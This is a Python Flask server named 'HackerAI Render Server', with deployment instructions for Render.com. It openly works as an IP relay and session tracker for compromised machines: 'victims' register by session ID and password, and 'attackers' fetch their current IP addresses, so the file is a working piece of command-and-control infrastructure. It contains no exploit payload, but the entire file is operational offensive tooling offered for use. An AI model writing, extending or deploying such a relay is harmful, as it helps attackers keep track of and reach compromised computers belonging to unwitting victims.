#!/usr/bin/env python3
"""
HackerAI Render Server — HTTP version for Render.com
Provides REST API endpoints for victims to register and attackers to query.

Endpoints:
  GET  /                    - Service info
  POST /register            - Register a victim session
  GET  /get/<session_id>    - Get victim IP by session ID
  GET  /list                - List all active sessions

Deploy on Render.com:
  - Start Command: gunicorn render_server_http:app --bind 0.0.0.0:$PORT
  - Health Check Path: /
  - Requirements: flask, gunicorn
"""

import os
import time
import json
import threading
from datetime import datetime
from flask import Flask, request, jsonify

app = Flask(__name__)

# ─── Configuration ────────────────────────────────────────────────────────────
SESSION_TIMEOUT = 300   # seconds before an unrefreshed session expires
CLEANUP_INTERVAL = 60   # seconds between cleanup passes

# ─── Session Store ────────────────────────────────────────────────────────────
active_sessions = {}
sessions_lock = threading.Lock()


def cleanup_expired_sessions():
    """Periodically remove stale sessions from the store."""
    while True:
        time.sleep(CLEANUP_INTERVAL)
        now = time.time()
        with sessions_lock:
            expired = [
                sid for sid, info in active_sessions.items()
                if now - info["timestamp"] > SESSION_TIMEOUT
            ]
            for sid in expired:
                print(f"[CLEANUP] Removing expired session: {sid}")
                del active_sessions[sid]


# Start cleanup thread in background
threading.Thread(target=cleanup_expired_sessions, daemon=True).start()


# ─── API Routes ───────────────────────────────────────────────────────────────

@app.route("/")
def index():
    """Root endpoint — service info and health check."""
    return jsonify({
        "service": "HackerAI Render Server",
        "version": "1.0",
        "status": "running",
        "active_sessions": len(active_sessions),
        "endpoints": {
            "POST /register": "Register a victim session. Body: {session_id, password, label?}",
            "GET /get/<session_id>": "Get victim IP. Query: ?password=...",
            "GET /list": "List all active sessions (no passwords)"
        },
        "timestamp": datetime.utcnow().isoformat()
    })


@app.route("/register", methods=["POST"])
def register():
    """
    Register a victim session.

    The victim's IP is automatically detected from the request's remote address.

    Request JSON body:
    {
        "session_id": "my_session_01",     # Required, 3-64 chars
        "password": "secret123",           # Required, 4-128 chars
        "label": "Windows-10-HR"           # Optional, friendly name
    }

    Returns:
        200: Session registered successfully
        400: Invalid request body
        403: Session ID already registered with different password
    """
    data = request.get_json(silent=True)
    if not data:
        return jsonify({"error": "Invalid JSON body. Send Content-Type: application/json"}), 400

    session_id = data.get("session_id", "").strip()
    password = data.get("password", "").strip()
    label = data.get("label", "unnamed").strip()

    # Validation
    if not session_id:
        return jsonify({"error": "session_id is required"}), 400
    if len(session_id) < 3 or len(session_id) > 64:
        return jsonify({"error": "session_id must be between 3 and 64 characters"}), 400
    if not password:
        return jsonify({"error": "password is required"}), 400
    if len(password) < 4 or len(password) > 128:
        return jsonify({"error": "password must be between 4 and 128 characters"}), 400

    client_ip = request.remote_addr

    with sessions_lock:
        # Check if session already exists
        if session_id in active_sessions:
            existing = active_sessions[session_id]
            if existing["password"] != password:
                return jsonify({
                    "error": "Session ID already registered with a different password"
                }), 403

            # Update timestamp and IP (in case victim's IP changed)
            existing["timestamp"] = time.time()
            existing["ip"] = client_ip
            existing["label"] = label

            print(f"[RE-REGISTER] Session '{session_id}' (label: {label}) ← {client_ip}")
            return jsonify({
                "status": "updated",
                "session_id": session_id,
                "ip": client_ip,
                "label": label,
                "message": "Session already existed — timestamp and IP updated"
            })

        # New session
        active_sessions[session_id] = {
            "ip": client_ip,
            "password": password,
            "timestamp": time.time(),
            "label": label
        }

    print(f"[REGISTER] Session '{session_id}' (label: {label}) ← {client_ip}")
    return jsonify({
        "status": "registered",
        "session_id": session_id,
        "ip": client_ip,
        "label": label
    }), 201


@app.route("/get/<session_id>", methods=["GET"])
def get_session(session_id):
    """
    Get victim connection info for a specific session.

    Query parameters:
        ?password=<password>    (required)

    Returns:
        200: Session found — returns IP, label, and registration time
        403: Incorrect password
        404: Session not found
    """
    password = request.args.get("password", "")

    if not password:
        return jsonify({"error": "password query parameter is required"}), 400

    with sessions_lock:
        if session_id not in active_sessions:
            return jsonify({"error": "Session not found"}), 404

        session = active_sessions[session_id]

        # Verify password
        if session["password"] != password:
            return jsonify({"error": "Incorrect password"}), 403

        # Return session info
        return jsonify({
            "session_id": session_id,
            "ip": session["ip"],
            "label": session["label"],
            "registered_at": datetime.fromtimestamp(session["timestamp"]).isoformat(),
            "age_seconds": int(time.time() - session["timestamp"])
        })


@app.route("/list", methods=["GET"])
def list_sessions():
    """
    List all active sessions.

    Returns session IDs, IPs, labels, and ages — but NOT passwords.

    Returns:
        200: List of active sessions
    """
    with sessions_lock:
        sessions_list = []
        for sid, info in sorted(active_sessions.items()):
            age_secs = int(time.time() - info["timestamp"])
            sessions_list.append({
                "session_id": sid,
                "ip": info["ip"],
                "label": info["label"],
                "age_seconds": age_secs,
                "registered_at": datetime.fromtimestamp(info["timestamp"]).isoformat()
            })

    return jsonify({
        "count": len(sessions_list),
        "sessions": sessions_list
    })


@app.route("/delete/<session_id>", methods=["DELETE"])
def delete_session(session_id):
    """
    Delete a session (cleanup).

    Query parameters:
        ?password=<password>    (required)

    Returns:
        200: Session deleted
        403: Incorrect password
        404: Session not found
    """
    password = request.args.get("password", "")

    with sessions_lock:
        if session_id not in active_sessions:
            return jsonify({"error": "Session not found"}), 404

        if active_sessions[session_id]["password"] != password:
            return jsonify({"error": "Incorrect password"}), 403

        del active_sessions[session_id]

    print(f"[DELETE] Session '{session_id}' removed")
    return jsonify({"status": "deleted", "session_id": session_id})


# ─── Error Handlers ───────────────────────────────────────────────────────────

@app.errorhandler(404)
def not_found(e):
    return jsonify({"error": "Endpoint not found"}), 404


@app.errorhandler(405)
def method_not_allowed(e):
    return jsonify({"error": "Method not allowed"}), 405


@app.errorhandler(500)
def internal_error(e):
    return jsonify({"error": "Internal server error"}), 500


# ─── Main Entry Point ─────────────────────────────────────────────────────────

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 9999))
    print(f"""
╔══════════════════════════════════════════════════╗
║       HackerAI Render Server v1.0                ║
║       HTTP IP Relay & Session Manager            ║
╠══════════════════════════════════════════════════╣
║  Port: {str(port):<45}║
║  Session timeout: {SESSION_TIMEOUT}s                     ║
║  Cleanup interval: {CLEANUP_INTERVAL}s                    ║
╚══════════════════════════════════════════════════╝
    """)
    app.run(host="0.0.0.0", port=port, debug=False)
